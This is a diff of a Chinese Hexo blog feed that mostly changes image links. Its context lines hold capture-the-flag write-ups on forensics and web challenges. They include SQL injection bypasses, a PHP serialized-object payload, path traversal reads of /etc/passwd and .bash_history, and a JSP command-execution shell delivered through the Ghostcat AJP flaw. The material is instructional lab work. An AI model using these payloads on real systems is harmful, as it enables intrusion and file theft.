@@ -8,24 +8,24 @@
 <h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="misc1-bluetooth"><a href="#misc1-bluetooth" class="headerlink" title="misc1(bluetooth)"></a>misc1(bluetooth)</h3><p>流量包分析，文件提取</p>
 <p>首先拿到这道题，没啥思路，那堆协议也没见过，尝试binwalk一下，发现一个7z压缩包，用dd命令提取出来</p>
 <p>发现里面的文本名称是<code>password_is_Bluetooth_PIN.txt</code>，然后就去流量包里找</p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/04/25/DASCTF-2020-April/1.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/04/25/DASCTF-2020-April/1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/04/25/DASCTF-2020-April/1.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>找到后解开压缩包，就得到flag了</p>
 <h3 id="misc2-keyboard"><a href="#misc2-keyboard" class="headerlink" title="misc2(keyboard)"></a>misc2(keyboard)</h3><p>vol文件提取、电脑键盘QWE密码、大小写转换、VeraCrypt文件挂载、NTFS</p>
 <p>下载得到两个文件，感觉很熟悉，有、像<code>1st XTUCTF</code>里面的一道取证，不过不太一样</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f Keyboard.raw imageinfo</span><br><span class="line">volatility -f Keyboard.raw --profile=Win7SP1x64 pslist  <span class="comment">#查看进程，发现VeraCrypt.exe和keyboard-log.exe</span></span><br><span class="line">volatility -f Keyboard.raw --profile=Win7SP1x64 filescan | grep keyboard  <span class="comment">#扫一下发现t.txt</span></span><br><span class="line">volatility -f Keyboard.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003d700880 --dump-dir=./ <span class="comment">#提取一下</span></span><br></pre></td></tr></table></figure></div>
 
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/25/DASCTF-2020-April/2.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/04/25/DASCTF-2020-April/2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/25/DASCTF-2020-April/2.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>然后通过下图解密给出的<code>CTKQEKNHZHQLLVGKROLATNWGQKRRKQGWNTA</code></p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/25/DASCTF-2020-April/3.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/04/25/DASCTF-2020-April/3.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/25/DASCTF-2020-April/3.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>得到<code>VERACRYPTPASSWORDISKEYBOARDDRAOBYEK</code>，提示小写更容易看出<code>veracryptpasswordiskeyboarddraobyek</code></p>
 <p>得到密码<code>keyboarddraobyek</code>，但是下面提示还是要大写。。。</p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/25/DASCTF-2020-April/4.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/04/25/DASCTF-2020-April/4.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/25/DASCTF-2020-April/4.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>拿VeraCrypt.exe加载一下Secret</p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/25/DASCTF-2020-April/5.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/04/25/DASCTF-2020-April/5.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/25/DASCTF-2020-April/5.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>猜一手NTFS，拿NtfsStreamsEditor2.exe扫一下，或者用dir命令</p>
 <h3 id="misc3-AWDshell"><a href="#misc3-AWDshell" class="headerlink" title="misc3(AWDshell)"></a>misc3(AWDshell)</h3><p>明天起来写</p>
@@ -110,8 +110,8 @@
         <category>Http</category>
       </categories>
       <tags>
-        <tag>Hexo</tag>
         <tag>Http</tag>
+        <tag>Hexo</tag>
       </tags>
   </entry>
   <entry>
@@ -128,13 +128,13 @@
 
 <p>3、执行bootstrap.sh下载镜像和二进制文件：<code>./bootstrap.sh</code></p>
 <p>会发现</p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/16/HyperLedger-Fabric/1.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/04/16/HyperLedger-Fabric/1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/16/HyperLedger-Fabric/1.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>卡在这，所以<code>vim bootstrap.sh</code>，将 <strong>binariesInstall</strong> 屏蔽后再执行</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$BINARIES</span>"</span> == <span class="string">"true"</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"Pull Hyperledger Fabric binaries"</span></span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">    <span class="comment">#pullBinaries</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure></div>
 
 <p>执行结果如下，执行完之后会发现在目录下创建了fabric-samples文件夹</p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/16/HyperLedger-Fabric/2.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/04/16/HyperLedger-Fabric/2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/16/HyperLedger-Fabric/2.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>然后把从网上下载的<code>hyperledger-fabric-linux-amd64-2.0.0.tar.gz</code>解压到这个目录下面</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar -zxvf hyperledger-fabric-linux-amd64-2.0.0.tar.gz</span><br></pre></td></tr></table></figure></div>
@@ -143,12 +143,12 @@
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;opt&#x2F;gopath&#x2F;src&#x2F;github.com&#x2F;hyperledger&#x2F;fabric&#x2F;scripts&#x2F;fabric-samples&#x2F;test-network</span><br><span class="line">.&#x2F;network.sh up</span><br></pre></td></tr></table></figure></div>
 
 <p>如图，表示启动成功，已启动一个orderer节点和两个peer节点。</p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/04/16/HyperLedger-Fabric/3.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/04/16/HyperLedger-Fabric/3.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/04/16/HyperLedger-Fabric/3.png" src="/img/loading.gif" class="lazyload"></a>
 
 <h3 id="使用测试网络"><a href="#使用测试网络" class="headerlink" title="使用测试网络"></a>使用测试网络</h3><p>1、创建channel，使用network.sh脚本创建来创建一个连接org1和org2组织并加入他们peer的通道，命令如下：</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;network.sh createChannel</span><br></pre></td></tr></table></figure></div>
 
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/04/16/HyperLedger-Fabric/4.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/04/16/HyperLedger-Fabric/4.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/04/16/HyperLedger-Fabric/4.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>创建成功，默认通道名为mychannel</p>
 <p>也可以带上channel标签，命令如下（-c ChannelName）：</p>
@@ -166,7 +166,7 @@
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">go env -w GO111MODULE=on</span><br><span class="line">go env -w GOPROXY=https://goproxy.cn,direct</span><br></pre></td></tr></table></figure></div>
 
 <p>得到下图，启动成功</p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/04/16/HyperLedger-Fabric/5.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/04/16/HyperLedger-Fabric/5.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/04/16/HyperLedger-Fabric/5.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>3、与网络互动</p>
 <p>网络启动之后，可以使用peer cli客户端去操作网络，可以通过cli客户端去调用部署智能合约，更新通道，或者安装和部署新的智能合约。</p>
@@ -185,14 +185,14 @@
     <url>/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/</url>
     <content><![CDATA[<p>人傻了，开这篇博客之前以为这就是场恶战。。没想到呀。。。好吧还行。。好多SQL。。。而且咋都变成1分了。。</p>
 <h3 id="EasySQL"><a href="#EasySQL" class="headerlink" title="EasySQL"></a>EasySQL</h3><p>万能密码，登录得到flag</p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/1.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/1.png" src="/img/loading.gif" class="lazyload"></a>
 
 <h3 id="Havefun"><a href="#Havefun" class="headerlink" title="Havefun"></a>Havefun</h3><p>F12发现下面代码，get传参cat=dog即可</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$cat=$_GET[<span class="string">'cat'</span>];</span><br><span class="line">        <span class="keyword">echo</span> $cat;</span><br><span class="line">        <span class="keyword">if</span>($cat==<span class="string">'dog'</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Syc&#123;cat_cat_cat_cat&#125;'</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>
 
 <h3 id="Secret-File"><a href="#Secret-File" class="headerlink" title="Secret File"></a>Secret File</h3><p>302重定向、filter伪协议</p>
 <p>拿到题跟着源代码走，发现有个302，bp抓一下包</p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/2.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/2.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>访问secr3t.php，得到以下源码</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
@@ -211,7 +211,7 @@
 <p>最后构造</p>
 <p>select=O%3A4%3A”Name”%3A<strong><em>3</em></strong>%3A%7Bs%3A14%3A”%00Name%00username”%3Bs%3A5%3A”admin”%3Bs%3A14%3A”%00Name%00password”%3Bi%3A100%3B%7D，得到flag</p>
 <h3 id="Knife"><a href="#Knife" class="headerlink" title="Knife"></a>Knife</h3><p>一句话已经给出来了，拿菜刀连一下或者直接传参进行命令执行就好啦。在根目录下发现flag</p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/3.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/3.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/3.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>然后再<code>cat /flag</code>就得到flag了</p>
 <h3 id="LoveSQL"><a href="#LoveSQL" class="headerlink" title="LoveSQL"></a>LoveSQL</h3><p>简单注入，先用万能密码登录一下，然后用order语句查表发现有三列</p>
@@ -224,7 +224,7 @@
 <p>最后访问后提示：No!!! you can only read this locally!!!，加一个XFF:127.0.0.1</p>
 <p>最后访问得到flag</p>
 <h3 id="BabySQL"><a href="#BabySQL" class="headerlink" title="BabySQL"></a>BabySQL</h3><p>首先尝试万能密码，发现or被过滤掉，双写绕过</p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/4.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/4.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/4.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>登录成功，尝试联合注入，发现union、select、where、from被过滤</p>
 <p>注入代码如下：</p>
@@ -369,7 +369,7 @@
 <p>非预期就是通过任意文件下载来读/home/tomajp/.bashrc_history，从而得到执行生成flag时的存放位置，进而去读flag所在文件得到flag，但是在buu上由于是docker生成的所以不需要去通过tomajp用户去生产flag所以就无非预期了。(其实还有，如果你能猜到根目录下存放flag的文件的名字，不过基本不可能。。因为它叫<code>flag78bt787it8b9b098j0k80k0ggg</code></p>
 <p>非预期解还挺简单的:</p>
 <p>1.任意上传一个文件，然后用错误的文件名去读一下，文件路径就会暴露出来</p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/02/WUSTCTF2020/3.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/04/02/WUSTCTF2020/3.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/02/WUSTCTF2020/3.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>2.<code>download?file=../../../../../../../etc/passwd</code>读到存在tomajp用户，然后下载它的bash_history文件 <code>download?file=../../../../../../../home/tomajp/.bash_history</code>发现执行过的命令，发现flag存放的文件夹，然后读取flag存放文件夹<code>download?file=../../../../../../../flaaaag/what_you_want</code>得到flag</p>
 <p>预期解：</p>
@@ -377,10 +377,10 @@
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">jsp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">java.io.InputStream in = Runtime.getRuntime().exec(<span class="string">"执行的命令"</span>).getInputStream();</span><br><span class="line"><span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line"><span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">out.print(<span class="string">"&lt;pre&gt;"</span>);</span><br><span class="line"><span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">	out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">&#125;</span><br><span class="line">out.print(<span class="string">"&lt;/pre&gt;"</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">执行的命令:</span></span><br><span class="line"><span class="comment">ls -al \ 被这个\坑傻了自动把后面的"转译了报错字符串闭合问题，不懂java的我还以为是字符串里的空格问题，后来偶然看到转译\\r的时候才反应过来所以我把命令换成了ls -al /</span></span><br><span class="line"><span class="comment">cat /flag78bt787it8b9b098j0k80k0ggg</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>
 
 <p>2.通过AJP包含这个jsp文件，从而执行其中的代码（<a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487" target="_blank" rel="noopener">脚本地址</a></p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/02/WUSTCTF2020/1.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/04/02/WUSTCTF2020/1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/02/WUSTCTF2020/1.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>发现根目录下flag存放位置，读取得到flag</p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/02/WUSTCTF2020/2.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/04/02/WUSTCTF2020/2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/02/WUSTCTF2020/2.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>详细步骤：先把这个ajpShooter.py上传到buu的linux-lab的机子上，然后用这个脚本包含你上传的文件，最后通过各样式的命令执行得到flag。反弹shell那个jsp脚本我用不来。。（注意：<code>Lan Domain: 2554-169ec896-03d5-483f-97ca-369fbcc3bdbf</code>用的是局域网，用read可以去读取文件的内容，eval是输出文件执行的结果。</p>
 <p>最后有时间去复现一下这个漏洞<a href="https://www.liuyixiang.com/post/109123.html" target="_blank" rel="noopener">CVE-2020-1938</a></p>
@@ -391,7 +391,7 @@
 
 <p>对着九键键盘翻译一下得到flag：<code>flag{youaremygirlfriends}</code></p>
 <h3 id="find-me"><a href="#find-me" class="headerlink" title="find_me"></a>find_me</h3><p>看备注+<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen" target="_blank" rel="noopener">盲文转换</a></p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/02/WUSTCTF2020/4.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/04/02/WUSTCTF2020/4.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/02/WUSTCTF2020/4.png" src="/img/loading.gif" class="lazyload"></a>
 
 <h3 id="爬"><a href="#爬" class="headerlink" title="爬"></a>爬</h3><p>判断文件类型为pdf，用wps等工具打开，图片后面有另一个图片，得到字符串</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x77637466323032307b746831735f31735f405f7064665f616e645f7930755f63616e5f7573655f70686f7430736830707d</span><br></pre></td></tr></table></figure></div>
